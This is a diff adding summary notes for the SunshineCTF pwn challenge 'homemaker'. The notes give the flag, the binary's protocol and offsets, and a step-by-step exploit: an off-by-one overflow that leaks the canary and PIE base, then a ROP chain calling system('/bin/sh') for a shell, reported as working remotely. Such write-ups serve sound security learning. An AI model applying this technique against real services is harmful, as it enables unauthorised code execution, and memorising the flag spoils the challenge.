@@ -1,0 +1,30 @@
+SUNSHINECTF pwn5 "homemaker" -- KEY FACTS (all verified by objdump+gdb)
+FLAG: sun{the_future_is_now_today_well_wait_how_are_you_reading_this}
+RUN : python3 exploit.py (local, dummy flag.txt) | python3 exploit.py REMOTE (works, real flag)
+BINARY: PIE x86-64 stripped, Canary + NX + FULL RELRO (GOT read-only -> no GOT overwrite).
+  GCC 11.4.0 Ubuntu 22.04 build -> remote glibc 2.35; local Arch glibc 2.44. No libc needed.
+PROTOCOL: ESC frame = 1b 5b | be16 len | payload | crc8(payload) | 1b 5c  (BIG endian, L<=0x7f9).
+  crc8: per byte acc^=b; 8x acc=(acc<<1)^0x2f if acc&0x80 else acc<<1.
+  server frame: same layout, field 4 = status. opcodes (jump table .rodata 0x21c8):
+  1 AUTH | 2 APPEND | 3 SEND STATE (leak) | 4 EJECT (exit loop->return) | 5 ECHO(fixed system).
+FUNCS(PIE-rel): 11e9 crc8 | 1289 validate(magic==0x1337c35f) | 12d2 system("/bin/echo -n ''")
+  1313 readn | 13a2 send_frame | 14cc recv_frame | 167c auth | 174c append(BUG) | 1810 send_state
+  1865 service_loop | 1a7f main. AUTH = opcode1 + be32 0x1337c35f (len 5) -> capacity=0x100.
+VULN 0x174c off-by-one: n=len-1; check `jbe` = "n<=capacity" but loop `i=0..n` writes n+1 bytes -> with n=capacity=0x100 the extra byte hits state[0x100] = LOW byte of capacity -> 0x0100
+  becomes 0x01ff. That byte is payload[0x101] = the frame CRC, so payload needs crc8==0xff
+  (brute force one byte: payload[1]=0xcd).
+STACK service_loop (state=rbp-0x110, gdb-verified): +0x108 CANARY | +0x110 saved rbp |
+  +0x118 ret into main = PIE+0x1a9f | +0x120 rsp after leave;ret (ROP) | +0x128 main canary.
+EXPLOIT: auth -> APPEND len 0x101 (cap->0x1ff) -> opcode3 leaks 0x1ff stack bytes
+  (canary, saved rbp, PIE base = leak[0x118]-0x1a9f, page-aligned self-check) -> APPEND len 0x200
+  writes canary back + [ret, pop rdi;ret, "/bin/sh", system@plt, 0] at state[0x118..] ->
+  opcode4 EJECT -> leave;ret -> shell. GADGETS: pop rdi;ret = PIE+0x12aa (5f c3 inside the imm32
+  of `cmp dword [rbp-0x14],0x1337c35f`), ret = PIE+0x101a, system@plt = PIE+0x10c0,
+  "/bin/sh" placed by us at PIE+0x4864+0x1f0 = PIE+0x4a54 in .bss rx buffer. Leading extra `ret`
+  when (saved_rbp+0x10)%16==0 for movaps alignment (gdb: rsp&0xf==8 at system entry). No SROP,
+  no libc offsets -> same exploit works on glibc 2.35 remote and 2.44 local.
+PITFALLS: pwntools process() defaults to PTY (must pass stdin=PIPE/stdout=PIPE);
+  `from pwn import *` eats sys.argv (read args before import); p16() is little-endian while the
+  protocol is big-endian (wrong length => silent hang: read(0,...,0x4fb)).
+FILES: exploit.py, FLAG.txt, notes.md (Traditional-Chinese full teaching writeup), NOTES_SUMMARY.txt,
+  disasm.txt, gdb_evidence.sh/.py + gdb_evidence_raw.txt + exploit_input.bin, remote_run.txt, flag.txt.
